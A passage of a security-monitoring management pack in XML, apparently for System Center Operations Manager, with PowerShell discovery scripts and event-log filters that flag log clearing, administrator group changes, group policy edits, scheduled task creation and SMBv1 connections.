                  $DomainControllers.AddProperty("$MPElement[Name='Security.Monitoring.SecurityMonitoringDA.DomainControllers']/DomainDnsName$", $DomainDnsName)
                  $DomainControllers.AddProperty("$MPElement[Name='System!System.Entity']/DisplayName$", $DistributedApplicationDC)
                  $DiscoveryData.AddInstance($DomainControllers)

                  # Create the 'Windows Domain Controller' instance
                  $DomainController = $DiscoveryData.CreateClassInstance("$MPElement[Name='Windows!Microsoft.Windows.Server.DC.Computer']$")
                  # Define the PrincipalName property value
                  $DomainController.AddProperty("$MPElement[Name='Windows!Microsoft.Windows.Computer']/PrincipalName$", $ComputerName)
                  $DiscoveryData.AddInstance($DomainController)

                  # Create a relationship between 'Distributed Application' and 'Domain Controller'
                  $SecurityMonitoringDARelationships = $DiscoveryData.CreateRelationshipInstance("$MPElement[Name='Security.Monitoring.SecurityMonitoringDARelationships']$")
                  $SecurityMonitoringDARelationships.Source = $DistributedApplication
                  $SecurityMonitoringDARelationships.Target = $DomainControllers
                  $DiscoveryData.AddInstance($SecurityMonitoringDARelationships)

                  # Create a relationship between 'Domain Controllers' and 'Domain Controller'
                  $SecurityMonitoringDARelationshipsForDCs = $DiscoveryData.CreateRelationshipInstance("$MPElement[Name='Security.Monitoring.SecurityMonitoringDARelationshipsForDCs']$")
                  $SecurityMonitoringDARelationshipsForDCs.Source = $DomainControllers
                  $SecurityMonitoringDARelationshipsForDCs.Target = $DomainController
                  $DiscoveryData.AddInstance($SecurityMonitoringDARelationshipsForDCs)

                  $API.LogScriptEvent($ScriptName,101,0,'Distributed Application Debug Event')

                  # Submit property bag
                  $DiscoveryData
                </ScriptBody>
                <Parameters>
                  <Parameter>
                    <Name>SourceID</Name>
                    <Value>$MPElement$</Value>
                  </Parameter>
                  <Parameter>
                    <Name>ManagedEntityID</Name>
                    <Value>$Target/Id$</Value>
                  </Parameter>
                  <Parameter>
                    <Name>ComputerName</Name>
                    <Value>$Config/ComputerName$</Value>
                  </Parameter>
                  <Parameter>
                    <Name>DomainDnsName</Name>
                    <Value>$Config/DomainDnsName$</Value>
                  </Parameter>
                </Parameters>
                <TimeoutSeconds>300</TimeoutSeconds>
              </DataSource>
            </MemberModules>
            <Composition>
              <Node ID="DS" />
            </Composition>
          </Composite>
        </ModuleImplementation>
        <OutputType>System!System.Discovery.Data</OutputType>
      </DataSourceModuleType>
      <DataSourceModuleType ID="Security.Monitoring.DistributedApplicationMS.DataSource" Accessibility="Public" Batching="false">
        <Configuration>
          <xsd:element minOccurs="1" name="IntervalSeconds" type="xsd:integer" xmlns:xsd="http://www.w3.org/2001/XMLSchema" />
          <xsd:element minOccurs="1" name="ComputerName" type="xsd:string" xmlns:xsd="http://www.w3.org/2001/XMLSchema" />
          <xsd:element minOccurs="1" name="DomainDnsName" type="xsd:string" xmlns:xsd="http://www.w3.org/2001/XMLSchema" />
        </Configuration>
        <OverrideableParameters>
          <OverrideableParameter ID="IntervalSeconds" Selector="$Config/IntervalSeconds$" ParameterType="int" />
        </OverrideableParameters>
        <ModuleImplementation Isolation="Any">
          <Composite>
            <MemberModules>
              <DataSource ID="DS" TypeID="Windows!Microsoft.Windows.TimedPowerShell.DiscoveryProvider">
                <IntervalSeconds>$Config/IntervalSeconds$</IntervalSeconds>
                <SyncTime />
                <ScriptName>DistributedApplicationMSDiscovery.ps1</ScriptName>
                <ScriptBody>
                  Param($SourceId,$ManagedEntityId,$ComputerName,$DomainDnsName)
                  $ScriptName = "DistributedApplicationMSDiscovery.ps1"
                  $API = New-Object -comObject 'MOM.ScriptAPI'
                  $DiscoveryData = $API.CreateDiscoveryData(0, $SourceId, $ManagedEntityId)

                  # Create the 'Distributed Application' instance
                  $DistributedApplicationName = "Security Monitoring"
                  $DistributedApplication = $DiscoveryData.CreateClassInstance("$MPElement[Name='Security.Monitoring.SecurityMonitoringDA']$")
                  $DistributedApplication.AddProperty("$MPElement[Name='Security.Monitoring.SecurityMonitoringDA']/DomainDnsName$", $DomainDnsName)
                  $DistributedApplication.AddProperty("$MPElement[Name='System!System.Entity']/DisplayName$", $DistributedApplicationName)
                  $DiscoveryData.AddInstance($DistributedApplication)

                  # Create the 'Windows Security Member Servers' instance
                  $DistributedApplicationMS = "Member Servers"
                  $MemberServers = $DiscoveryData.CreateClassInstance("$MPElement[Name='Security.Monitoring.SecurityMonitoringDA.MemberServers']$")
                  # Define the DomainDnsName property value
                  $MemberServers.AddProperty("$MPElement[Name='Security.Monitoring.SecurityMonitoringDA.MemberServers']/DomainDnsName$", $DomainDnsName)
                  $MemberServers.AddProperty("$MPElement[Name='System!System.Entity']/DisplayName$", $DistributedApplicationMS)
                  $DiscoveryData.AddInstance($MemberServers)

                  # Create the 'Windows MemberServer' instance
                  $MemberServer = $DiscoveryData.CreateClassInstance("$MPElement[Name='Windows!Microsoft.Windows.Computer']$")
                  # Define the PrincipalName property value
                  $MemberServer.AddProperty("$MPElement[Name='Windows!Microsoft.Windows.Computer']/PrincipalName$", $ComputerName)
                  $DiscoveryData.AddInstance($MemberServer)

                  # Create a relationship between 'Distributed Application' and 'Domain Controller'
                  $SecurityMonitoringDARelationships = $DiscoveryData.CreateRelationshipInstance("$MPElement[Name='Security.Monitoring.SecurityMonitoringDARelationshipsforMS']$")
                  $SecurityMonitoringDARelationships.Source = $DistributedApplication
                  $SecurityMonitoringDARelationships.Target = $MemberServers
                  $DiscoveryData.AddInstance($SecurityMonitoringDARelationships)

                  # Create a relationship between 'MemberServers' and 'MemberServer'
                  $SecurityMonitoringDARelationshipsForMembers = $DiscoveryData.CreateRelationshipInstance("$MPElement[Name='Security.Monitoring.SecurityMonitoringDARelationshipsForMemberServers']$")
                  $SecurityMonitoringDARelationshipsForMembers.Source = $MemberServers
                  $SecurityMonitoringDARelationshipsForMembers.Target = $MemberServer
                  $DiscoveryData.AddInstance($SecurityMonitoringDARelationshipsForMembers)

                  $API.LogScriptEvent($ScriptName,101,0,'Distributed Application Debug Event')

                  # Submit property bag
                  $DiscoveryData
                </ScriptBody>
                <Parameters>
                  <Parameter>
                    <Name>SourceID</Name>
                    <Value>$MPElement$</Value>
                  </Parameter>
                  <Parameter>
                    <Name>ManagedEntityID</Name>
                    <Value>$Target/Id$</Value>
                  </Parameter>
                  <Parameter>
                    <Name>ComputerName</Name>
                    <Value>$Config/ComputerName$</Value>
                  </Parameter>
                  <Parameter>
                    <Name>DomainDnsName</Name>
                    <Value>$Config/DomainDnsName$</Value>
                  </Parameter>
                </Parameters>
                <TimeoutSeconds>300</TimeoutSeconds>
              </DataSource>
            </MemberModules>
            <Composition>
              <Node ID="DS" />
            </Composition>
          </Composite>
        </ModuleImplementation>
        <OutputType>System!System.Discovery.Data</OutputType>
      </DataSourceModuleType>
      <DataSourceModuleType ID="SecurityMonitoringMP.Modules.SecurityLogClear.DS" Accessibility="Public" Batching="false">
        <Configuration>
          <xsd:element minOccurs="0" name="AutoAccount" type="xsd:string" xmlns:xsd="http://www.w3.org/2001/XMLSchema" />
        </Configuration>
        <OverrideableParameters>
          <OverrideableParameter ID="AutoAccount" Selector="$Config/AutoAccount$" ParameterType="string" />
        </OverrideableParameters>
        <ModuleImplementation Isolation="Any">
          <Composite>
            <MemberModules>
              <DataSource ID="Event" TypeID="Windows!Microsoft.Windows.EventProvider">
                <ComputerName />
                <LogName>Security</LogName>
                <Expression>
                  <And>
                    <Expression>
                      <SimpleExpression>
                        <ValueExpression>
                          <XPathQuery Type="UnsignedInteger">EventDisplayNumber</XPathQuery>
                        </ValueExpression>
                        <Operator>Equal</Operator>
                        <ValueExpression>
                          <Value Type="UnsignedInteger">1102</Value>
                        </ValueExpression>
                      </SimpleExpression>
                    </Expression>
                    <Expression>
                      <SimpleExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">PublisherName</XPathQuery>
                        </ValueExpression>
                        <Operator>Equal</Operator>
                        <ValueExpression>
                          <Value Type="String">Microsoft-Windows-Eventlog</Value>
                        </ValueExpression>
                      </SimpleExpression>
                    </Expression>
                    <Expression>
                      <SimpleExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">Params/Param[2]</XPathQuery>
                        </ValueExpression>
                        <Operator>NotEqual</Operator>
                        <ValueExpression>
                          <Value Type="String">$Config/AutoAccount$</Value>
                        </ValueExpression>
                      </SimpleExpression>
                    </Expression>
                  </And>
                </Expression>
              </DataSource>
            </MemberModules>
            <Composition>
              <Node ID="Event" />
            </Composition>
          </Composite>
        </ModuleImplementation>
        <OutputType>Windows!Microsoft.Windows.EventData</OutputType>
      </DataSourceModuleType>
      <DataSourceModuleType ID="Security.Monitoring.SMBv1Connections.DS" Accessibility="Internal" Batching="false">
        <Configuration>
          <xsd:element minOccurs="1" name="IntervalSeconds" type="xsd:integer" xmlns:xsd="http://www.w3.org/2001/XMLSchema" />
          <xsd:element minOccurs="0" name="SyncTime" type="xsd:string" xmlns:xsd="http://www.w3.org/2001/XMLSchema" />
          <xsd:element minOccurs="1" name="TimeOut" type="xsd:integer" xmlns:xsd="http://www.w3.org/2001/XMLSchema" />
        </Configuration>
        <OverrideableParameters>
          <OverrideableParameter ID="IntervalSeconds" Selector="$Config/IntervalSeconds$" ParameterType="int" />
          <OverrideableParameter ID="SyncTime" Selector="$Config/SyncTime$" ParameterType="string" />
          <OverrideableParameter ID="TimeOut" Selector="$Config/TimeOut$" ParameterType="int" />
        </OverrideableParameters>
        <ModuleImplementation Isolation="Any">
          <Composite>
            <MemberModules>
              <DataSource ID="Schedule" TypeID="System!System.SimpleScheduler">
                <IntervalSeconds>$Config/IntervalSeconds$</IntervalSeconds>
                <SyncTime>$Config/SyncTime$</SyncTime>
              </DataSource>
              <ProbeAction ID="PSScript" TypeID="Security.Monitoring.SMBv1Connections.PowerShell">
                <TimeOut>$Config/TimeOut$</TimeOut>
              </ProbeAction>
              <ConditionDetection ID="Collect" TypeID="System!System.ExpressionFilter">
                <Expression>
                  <SimpleExpression>
                    <ValueExpression>
                      <XPathQuery Type="Integer">Property[@Name='Connections']</XPathQuery>
                    </ValueExpression>
                    <Operator>Equal</Operator>
                    <ValueExpression>
                      <Value Type="Integer">1</Value>
                    </ValueExpression>
                  </SimpleExpression>
                </Expression>
              </ConditionDetection>
            </MemberModules>
            <Composition>
              <Node ID="Collect">
                <Node ID="PSScript">
                  <Node ID="Schedule" />
                </Node>
              </Node>
            </Composition>
          </Composite>
        </ModuleImplementation>
        <OutputType>System!System.BaseData</OutputType>
      </DataSourceModuleType>
      <DataSourceModuleType ID="SecurityMonitoringMP.GPOMonitoring.GPOEvent.DS" Accessibility="Public" Batching="false">
        <Configuration>
          <xsd:element minOccurs="0" name="AGPMAccount" type="xsd:string" xmlns:xsd="http://www.w3.org/2001/XMLSchema" />
          <xsd:element minOccurs="0" name="Event" type="xsd:integer" xmlns:xsd="http://www.w3.org/2001/XMLSchema" />
        </Configuration>
        <OverrideableParameters>
          <OverrideableParameter ID="AGPMAccount" Selector="$Config/AGPMAccount$" ParameterType="string" />
        </OverrideableParameters>
        <ModuleImplementation Isolation="Any">
          <Composite>
            <MemberModules>
              <DataSource ID="Event" TypeID="Windows!Microsoft.Windows.EventProvider">
                <ComputerName />
                <LogName>Security</LogName>
                <Expression>
                  <And>
                    <Expression>
                      <Or>
                        <Expression>
                          <SimpleExpression>
                            <ValueExpression>
                              <XPathQuery Type="String">Params/Param[11]</XPathQuery>
                            </ValueExpression>
                            <Operator>Equal</Operator>
                            <ValueExpression>
                              <Value Type="String">groupPolicyContainer</Value>
                            </ValueExpression>
                          </SimpleExpression>
                        </Expression>
                        <Expression>
                          <SimpleExpression>
                            <ValueExpression>
                              <XPathQuery Type="String">Params/Param[11]</XPathQuery>
                            </ValueExpression>
                            <Operator>Equal</Operator>
                            <ValueExpression>
                              <Value Type="String">domainDNS</Value>
                            </ValueExpression>
                          </SimpleExpression>
                        </Expression>
                      </Or>
                    </Expression>
                    <Expression>
                      <SimpleExpression>
                        <ValueExpression>
                          <XPathQuery Type="UnsignedInteger">EventDisplayNumber</XPathQuery>
                        </ValueExpression>
                        <Operator>Equal</Operator>
                        <ValueExpression>
                          <Value Type="UnsignedInteger">$Config/Event$</Value>
                        </ValueExpression>
                      </SimpleExpression>
                    </Expression>
                    <Expression>
                      <SimpleExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">Params/Param[4]</XPathQuery>
                        </ValueExpression>
                        <Operator>NotEqual</Operator>
                        <ValueExpression>
                          <Value Type="String">$Config/AGPMAccount$</Value>
                        </ValueExpression>
                      </SimpleExpression>
                    </Expression>
                  </And>
                </Expression>
              </DataSource>
            </MemberModules>
            <Composition>
              <Node ID="Event" />
            </Composition>
          </Composite>
        </ModuleImplementation>
        <OutputType>Windows!Microsoft.Windows.EventData</OutputType>
      </DataSourceModuleType>
      <DataSourceModuleType ID="SecurityMonitoringMP.LocalAccountChange.DS" Accessibility="Public" Batching="false">
        <Configuration>
          <xsd:element minOccurs="0" name="SID1" type="xsd:string" xmlns:xsd="http://www.w3.org/2001/XMLSchema" />
          <xsd:element minOccurs="0" name="SID2" type="xsd:string" xmlns:xsd="http://www.w3.org/2001/XMLSchema" />
          <xsd:element minOccurs="0" name="SID3" type="xsd:string" xmlns:xsd="http://www.w3.org/2001/XMLSchema" />
          <xsd:element minOccurs="0" name="SID4" type="xsd:string" xmlns:xsd="http://www.w3.org/2001/XMLSchema" />
          <xsd:element minOccurs="0" name="SID5" type="xsd:string" xmlns:xsd="http://www.w3.org/2001/XMLSchema" />
        </Configuration>
        <OverrideableParameters>
          <OverrideableParameter ID="SID1" Selector="$Config/SID1$" ParameterType="string" />
          <OverrideableParameter ID="SID2" Selector="$Config/SID2$" ParameterType="string" />
          <OverrideableParameter ID="SID3" Selector="$Config/SID3$" ParameterType="string" />
          <OverrideableParameter ID="SID4" Selector="$Config/SID4$" ParameterType="string" />
          <OverrideableParameter ID="SID5" Selector="$Config/SID5$" ParameterType="string" />
        </OverrideableParameters>
        <ModuleImplementation Isolation="Any">
          <Composite>
            <MemberModules>
              <DataSource ID="Event" TypeID="Windows!Microsoft.Windows.EventProvider">
                <ComputerName>$Target/Host/Property[Type="Windows!Microsoft.Windows.Computer"]/NetworkName$</ComputerName>
                <LogName>Security</LogName>
                <Expression>
                  <And>
                    <Expression>
                      <Or>
                        <Expression>
                          <SimpleExpression>
                            <ValueExpression>
                              <XPathQuery Type="UnsignedInteger">EventDisplayNumber</XPathQuery>
                            </ValueExpression>
                            <Operator>Equal</Operator>
                            <ValueExpression>
                              <Value Type="UnsignedInteger">4732</Value>
                            </ValueExpression>
                          </SimpleExpression>
                        </Expression>
                        <Expression>
                          <SimpleExpression>
                            <ValueExpression>
                              <XPathQuery Type="UnsignedInteger">EventDisplayNumber</XPathQuery>
                            </ValueExpression>
                            <Operator>Equal</Operator>
                            <ValueExpression>
                              <Value Type="UnsignedInteger">4733</Value>
                            </ValueExpression>
                          </SimpleExpression>
                        </Expression>
                      </Or>
                    </Expression>
                    <Expression>
                      <RegExExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">Params/Param[2]</XPathQuery>
                        </ValueExpression>
                        <Operator>DoesNotContainSubstring</Operator>
                        <Pattern>$Config/SID1$</Pattern>
                      </RegExExpression>
                    </Expression>
                    <Expression>
                      <RegExExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">Params/Param[2]</XPathQuery>
                        </ValueExpression>
                        <Operator>DoesNotContainSubstring</Operator>
                        <Pattern>$Config/SID2$</Pattern>
                      </RegExExpression>
                    </Expression>
                    <Expression>
                      <RegExExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">Params/Param[2]</XPathQuery>
                        </ValueExpression>
                        <Operator>DoesNotContainSubstring</Operator>
                        <Pattern>$Config/SID3$</Pattern>
                      </RegExExpression>
                    </Expression>
                    <Expression>
                      <RegExExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">Params/Param[2]</XPathQuery>
                        </ValueExpression>
                        <Operator>DoesNotContainSubstring</Operator>
                        <Pattern>$Config/SID4$</Pattern>
                      </RegExExpression>
                    </Expression>
                    <Expression>
                      <RegExExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">Params/Param[2]</XPathQuery>
                        </ValueExpression>
                        <Operator>DoesNotContainSubstring</Operator>
                        <Pattern>$Config/SID5$</Pattern>
                      </RegExExpression>
                    </Expression>
                    <Expression>
                      <SimpleExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">Params/Param[3]</XPathQuery>
                        </ValueExpression>
                        <Operator>Equal</Operator>
                        <ValueExpression>
                          <Value Type="String">Administrators</Value>
                        </ValueExpression>
                      </SimpleExpression>
                    </Expression>
                    <Expression>
                      <SimpleExpression>
                        <ValueExpression>
                          <XPathQuery Type="String">Params/Param[4]</XPathQuery>
                        </ValueExpression>
                        <Operator>Equal</Operator>
                        <ValueExpression>
                          <Value Type="String">Builtin</Value>
                        </ValueExpression>
                      </SimpleExpression>
                    </Expression>
                  </And>
                </Expression>
              </DataSource>
            </MemberModules>
            <Composition>
              <Node ID="Event" />
            </Composition>
          </Composite>
        </ModuleImplementation>
        <OutputType>Windows!Microsoft.Windows.EventData</OutputType>
      </DataSourceModuleType>
      <DataSourceModuleType ID="SecurityMonitoringMP.ScheduledTaskCreation.DS" Accessibility="Public" Batching="false">
        <Configuration>
          <xsd:element minOccurs="0" name="App1" type="xsd:string" xmlns:xsd="http://www.w3.org/2001/XMLSchema" />
          <xsd:element minOccurs="0" name="App2" type="xsd:string" xmlns:xsd="http://www.w3.org/2001/XMLSchema" />
          <xsd:element minOccurs="0" name="App3" type="xsd:string" xmlns:xsd="http://www.w3.org/2001/XMLSchema" />
          <xsd:element minOccurs="0" name="App4" type="xsd:string" xmlns:xsd="http://www.w3.org/2001/XMLSchema" />
          <xsd:element minOccurs="0" name="App5" type="xsd:string" xmlns:xsd="http://www.w3.org/2001/XMLSchema" />
        </Configuration>
        <OverrideableParameters>
          <OverrideableParameter ID="App1" Selector="$Config/App1$" ParameterType="string" />
          <OverrideableParameter ID="App2" Selector="$Config/App2$" ParameterType="string" />
          <OverrideableParameter ID="App3" Selector="$Config/App3$" ParameterType="string" />
          <OverrideableParameter ID="App4" Selector="$Config/App4$" ParameterType="string" />
          <OverrideableParameter ID="App5" Selector="$Config/App5$" ParameterType="string" />
        </OverrideableParameters>
        <ModuleImplementation Isolation="Any">
          <Composite>
            <MemberModules>
              <DataSource ID="Event" TypeID="Windows!Microsoft.Windows.EventProvider">
                <ComputerName>$Target/Host/Property[Type="Windows!Microsoft.Windows.Computer"]/NetworkName$</ComputerName>
                <LogName>Security</LogName>
                <Expression>
                  <And>
                    <Expression>
                      <SimpleExpression>
                        <ValueExpression>
                          <XPathQuery Type="UnsignedInteger">EventDisplayNumber</XPathQuery>
                        </ValueExpression>
                        <Operator>Equal</Operator>
                        <ValueExpression>
                          <Value Type="UnsignedInteger">4698</Value>
                        </ValueExpression>
                      </SimpleExpression>
                    </Expression>
                    <Expression>
                      <And>
                        <Expression>
                          <RegExExpression>
                            <ValueExpression>
                              <XPathQuery Type="String">Params/Param[6]</XPathQuery>
                            </ValueExpression>
                            <Operator>DoesNotContainSubstring</Operator>
                            <Pattern>Microsoft\Windows\UpdateOrchestrator\MusUx_LogonUpdateResults</Pattern>
                          </RegExExpression>
                        </Expression>
                        <Expression>
                          <RegExExpression>
                            <ValueExpression>
                              <XPathQuery Type="String">Params/Param[6]</XPathQuery>
                            </ValueExpression>
                            <Operator>DoesNotContainSubstring</Operator>
                            <Pattern>Microsoft\Windows\UpdateOrchestrator</Pattern>
                          </RegExExpression>
                        </Expression>
                        <Expression>
                          <RegExExpression>
                            <ValueExpression>
                              <XPathQuery Type="String">Params/Param[6]</XPathQuery>
                            </ValueExpression>
                            <Operator>DoesNotContainSubstring</Operator>
                            <Pattern>$Config/App1$</Pattern>
                          </RegExExpression>
                        </Expression>
                        <Expression>
                          <RegExExpression>
                            <ValueExpression>
                              <XPathQuery Type="String">Params/Param[6]</XPathQuery>
                            </ValueExpression>
                            <Operator>DoesNotContainSubstring</Operator>
                            <Pattern>$Config/App2$</Pattern>
                          </RegExExpression>
                        </Expression>
                        <Expression>
                          <RegExExpression>
                            <ValueExpression>
                              <XPathQuery Type="String">Params/Param[6]</XPathQuery>
                            </ValueExpression>
                            <Operator>DoesNotContainSubstring</Operator>
                            <Pattern>$Config/App3$</Pattern>
                          </RegExExpression>
                        </Expression>
                        <Expression>
                          <RegExExpression>
                            <ValueExpression>
                              <XPathQuery Type="String">Params/Param[6]</XPathQuery>
                            </ValueExpression>
                            <Operator>DoesNotContainSubstring</Operator>
                            <Pattern>$Config/App4$</Pattern>
                          </RegExExpression>
                        </Expression>
                        <Expression>
                          <RegExExpression>
                            <ValueExpression>
                              <XPathQuery Type="String">Params/Param[6]</XPathQuery>
                            </ValueExpression>
                            <Operator>DoesNotContainSubstring</Operator>
                            <Pattern>$Config/App5$</Pattern>
                          </RegExExpression>
                        </Expression>
                        <Expression>
                          <RegExExpression>
                            <ValueExpression>
                              <XPathQuery Type="String">Params/Param[6]</XPathQuery>
                            </ValueExpression>
                            <Operator>DoesNotContainSubstring</Operator>
                            <Pattern>\Microsoft\Windows\Windows Defender\Windows Defender</Pattern>
                          </RegExExpression>
                        </Expression>
                        <Expression>
                          <RegExExpression>
                            <ValueExpression>
                              <XPathQuery Type="String">Params/Param[6]</XPathQuery>
                            </ValueExpression>
                            <Operator>DoesNotContainSubstring</Operator>
                            <Pattern>\User_Feed_Synchronization</Pattern>
                          </RegExExpression>
                        </Expression>
                        <Expression>
                          <RegExExpression>
                            <ValueExpression>
                              <XPathQuery Type="String">Params/Param[6]</XPathQuery>
                            </ValueExpression>
                            <Operator>DoesNotContainSubstring</Operator>
                            <Pattern>Microsoft\Windows\UpdateOrchestrator\MusUx_LogonReboot</Pattern>
                          </RegExExpression>
                        </Expression>
                        <Expression>
                          <RegExExpression>
                            <ValueExpression>
                              <XPathQuery Type="String">Params/Param[6]</XPathQuery>
                            </ValueExpression>
                            <Operator>DoesNotContainSubstring</Operator>
                            <Pattern>Microsoft\Windows\WindowsUpdate\Scheduled Start</Pattern>
                          </RegExExpression>
                        </Expression>
                        <Expression>
                          <RegExExpression>
                            <ValueExpression>
                              <XPathQuery Type="String">Params/Param[6]</XPathQuery>
                            </ValueExpression>
                            <Operator>DoesNotContainSubstring</Operator>
                            <Pattern>Microsoft\Windows\AppID\EDP Policy Manager</Pattern>
                          </RegExExpression>
                        </Expression>
                        <Expression>
                          <RegExExpression>
                            <ValueExpression>
                              <XPathQuery Type="String">Params/Param[6]</XPathQuery>
                            </ValueExpression>
                            <Operator>DoesNotContainSubstring</Operator>
                            <Pattern>Microsoft\Windows\WindowsUpdate\Automatic App Update</Pattern>
                          </RegExExpression>
                        </Expression>
                        <Expression>
                          <RegExExpression>
                            <ValueExpression>
                              <XPathQuery Type="String">Params/Param[6]</XPathQuery>
                            </ValueExpression>
                            <Operator>DoesNotContainSubstring</Operator>
                            <Pattern>Microsoft\Windows\Windows Filtering Platform\BfeOnServiceStartTypeChange</Pattern>
                          </RegExExpression>
                        </Expression>
                        <Expression>
                          <RegExExpression>
                            <ValueExpression>
                              <XPathQuery Type="String">Params/Param[6]</XPathQuery>
                            </ValueExpression>
                            <Operator>DoesNotContainSubstring</Operator>
                            <Pattern>Microsoft\Windows\Shell\CrawlStartPages</Pattern>
                          </RegExExpression>
                        </Expression>
                        <Expression>
                          <RegExExpression>
                            <ValueExpression>
                              <XPathQuery Type="String">Params/Param[6]</XPathQuery>
                            </ValueExpression>
                            <Operator>DoesNotContainSubstring</Operator>
                            <Pattern>Microsoft Antimalware Scheduled Scan</Pattern>
                          </RegExExpression>
                        </Expression>
                        <Expression>
                          <RegExExpression>
                            <ValueExpression>
                              <XPathQuery Type="String">Params/Param[6]</XPathQuery>
                            </ValueExpression>
                            <Operator>DoesNotContainSubstring</Operator>
                            <Pattern>Symantec Endpoint Protection</Pattern>
                          </RegExExpression>
                        </Expression>
                        <Expression>
                          <RegExExpression>
                            <ValueExpression>
                              <XPathQuery Type="String">Params/Param[6]</XPathQuery>
                            </ValueExpression>
                            <Operator>DoesNotContainSubstring</Operator>
                            <Pattern>Microsoft\Configuration Manager</Pattern>
                          </RegExExpression>
                        </Expression>
                        <Expression>
                          <RegExExpression>
                            <ValueExpression>
                              <XPathQuery Type="String">Params/Param[6]</XPathQuery>
                            </ValueExpression>
                            <Operator>DoesNotContainSubstring</Operator>
                            <Pattern>Intel Security DAT Reputation</Pattern>
                          </RegExExpression>
                        </Expression>
                        <Expression>
                          <RegExExpression>
                            <ValueExpression>
                              <XPathQuery Type="String">Params/Param[6]</XPathQuery>
                            </ValueExpression>
                            <Operator>DoesNotContainSubstring</Operator>
                            <Pattern>Microsoft Office 15 Sync Maintenance</Pattern>
                          </RegExExpression>
                        </Expression>
                        <Expression>
                          <RegExExpression>
                            <ValueExpression>
                              <XPathQuery Type="String">Params/Param[6]</XPathQuery>
                            </ValueExpression>
                            <Operator>DoesNotContainSubstring</Operator>
                            <Pattern>Optimize Start Menu Cache Files</Pattern>
                          </RegExExpression>
                        </Expression>
                        <Expression>
                          <RegExExpression>
                            <ValueExpression>
                              <XPathQuery Type="String">Params/Param[6]</XPathQuery>
                            </ValueExpression>
                            <Operator>DoesNotContainSubstring</Operator>
                            <Pattern>Software Inventory Logging\Collection</Pattern>
                          </RegExExpression>
                        </Expression>
                        <Expression>
                          <RegExExpression>
                            <ValueExpression>
                              <XPathQuery Type="String">Params/Param[6]</XPathQuery>
                            </ValueExpression>
                            <Operator>DoesNotContainSubstring</Operator>
                            <Pattern>Software Inventory Logging\Daily Collector</Pattern>
                          </RegExExpression>
                        </Expression>
                        <Expression>
                          <RegExExpression>
                            <ValueExpression>
                              <XPathQuery Type="String">Params/Param[6]</XPathQuery>
                            </ValueExpression>
                            <Operator>DoesNotContainSubstring</Operator>
                            <Pattern>Software Inventory Logging\Configuration</Pattern>
                          </RegExExpression>
                        </Expression>
                        <Expression>
                          <RegExExpression>
                            <ValueExpression>
                              <XPathQuery Type="String">Params/Param[6]</XPathQuery>
                            </ValueExpression>
                            <Operator>DoesNotContainSubstring</Operator>
                            <Pattern>ReplaceOMCert</Pattern>
                          </RegExExpression>
                        </Expression>
                        <Expression>
                          <RegExExpression>
                            <ValueExpression>
                              <XPathQuery Type="String">Params/Param[6]</XPathQuery>
                            </ValueExpression>
                            <Operator>DoesNotContainSubstring</Operator>
                            <Pattern>MRT_ERROR_HB</Pattern>
                          </RegExExpression>
                        </Expression>
                      </And>
                    </Expression>
                  </And>
                </Expression>
              </DataSource>
            </MemberModules>
            <Composition>
              <Node ID="Event" />
            </Composition>
          </Composite>
        </ModuleImplementation>
        <OutputType>Windows!Microsoft.Windows.EventData</OutputType>
      </DataSourceModuleType>
      <DataSourceModuleType ID="Security.Monitoring.MultiStringRegistry.DS" Accessibility="Internal" Batching="false">
        <Configuration>
          <xsd:element minOccurs="1" name="IntervalSeconds" type="xsd:integer" xmlns:xsd="http://www.w3.org/2001/XMLSchema" />
          <xsd:element minOccurs="0" name="SyncTime" type="xsd:string" xmlns:xsd="http://www.w3.org/2001/XMLSchema" />
          <xsd:element minOccurs="1" name="RegKey" type="xsd:string" xmlns:xsd="http://www.w3.org/2001/XMLSchema" />
          <xsd:element minOccurs="1" name="RegAttribute" type="xsd:string" xmlns:xsd="http://www.w3.org/2001/XMLSchema" />
        </Configuration>
        <OverrideableParameters>
          <OverrideableParameter ID="IntervalSeconds" Selector="$Config/IntervalSeconds$" ParameterType="int" />
          <OverrideableParameter ID="SyncTime" Selector="$Config/SyncTime$" ParameterType="string" />
        </OverrideableParameters>
        <ModuleImplementation Isolation="Any">
          <Composite>
            <MemberModules>
              <DataSource ID="Schedule" TypeID="System!System.SimpleScheduler">
                <IntervalSeconds>$Config/IntervalSeconds$</IntervalSeconds>
                <SyncTime>$Config/SyncTime$</SyncTime>
              </DataSource>
              <ProbeAction ID="PSScript" TypeID="Security.Monitoring.MultiStringRegistry.PowerShell">
                <RegKey>$Config/RegKey$</RegKey>
                <RegAttribute>$Config/RegAttribute$</RegAttribute>
              </ProbeAction>
            </MemberModules>
            <Composition>
              <Node ID="PSScript">
                <Node ID="Schedule" />
              </Node>
            </Composition>
          </Composite>
        </ModuleImplementation>
        <OutputType>System!System.BaseData</OutputType>
      </DataSourceModuleType>
      <DataSourceModuleType ID="SecurityMonitoringMP.DCServiceCreation.DS" Accessibility="Public" Batching="false">
        <Configuration>
          <xsd:element minOccurs="0" name="App1" type="xsd:string" xmlns:xsd="http://www.w3.org/2001/XMLSchema" />
          <xsd:element minOccurs="0" name="App2" type="xsd:string" xmlns:xsd="http://www.w3.org/2001/XMLSchema" />
          <xsd:element minOccurs="0" name="App3" type="xsd:string" xmlns:xsd="http://www.w3.org/2001/XMLSchema" />
          <xsd:element minOccurs="0" name="App4" type="xsd:string" xmlns:xsd="http://www.w3.org/2001/XMLSchema" />
          <xsd:element minOccurs="0" name="App5" type="xsd:string" xmlns:xsd="http://www.w3.org/2001/XMLSchema" />
        </Configuration>
        <OverrideableParameters>
          <OverrideableParameter ID="App1" Selector="$Config/App1$" ParameterType="string" />
          <OverrideableParameter ID="App2" Selector="$Config/App2$" ParameterType="string" />
          <OverrideableParameter ID="App3" Selector="$Config/App3$" ParameterType="string" />
          <OverrideableParameter ID="App4" Selector="$Config/App4$" ParameterType="string" />
          <OverrideableParameter ID="App5" Selector="$Config/App5$" ParameterType="string" />
        </OverrideableParameters>
        <ModuleImplementation Isolation="Any">
          <Composite>
            <MemberModules>
              <DataSource ID="Event" TypeID="Windows!Microsoft.Windows.EventProvider">
                <ComputerName>$Target/Property[Type="Windows!Microsoft.Windows.Computer"]/NetworkName$</ComputerName>
                <LogName>System</LogName>
